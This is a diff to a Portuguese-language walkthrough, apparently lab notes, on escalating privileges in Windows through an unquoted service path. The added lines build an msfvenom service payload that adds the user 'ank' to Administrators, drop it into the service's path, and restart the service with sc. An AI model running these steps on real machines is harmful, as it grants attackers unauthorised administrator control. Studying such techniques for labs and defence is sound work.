@@ -144,7 +144,25 @@ Agora, paramos o servico e damos start novamente.
 
 > sc start unquotedsvc
 
-POW!! temos nosso priv esc. no caso adicionamos o user (ank)no grupo de administrators.
+POW!! temos nosso priv esc. no caso adicionamos o user (ank).
+
+Agora vamos reperir os passos anteriores e add nosso user (ank) no grupo de ADMINISTRATORS
+
+criamos novamente nosso payload, mas agora com o comando para add ao grupo.
+
+> msfvenom -p windows/exec CMD="net localgroup administrators ank /add" -f exe-service -o common.exe
+
+Transferimos para nossa maquina alvo e adicionamos nosso payload no directorio.
+
+> C:\Program Files\Unquoted Path Service\Common Files\
+
+Agora, paramos o servico e damos start novamente.
+
+> sc stop unquotedsvc
+
+> sc start unquotedsvc
+
+
 
 
 
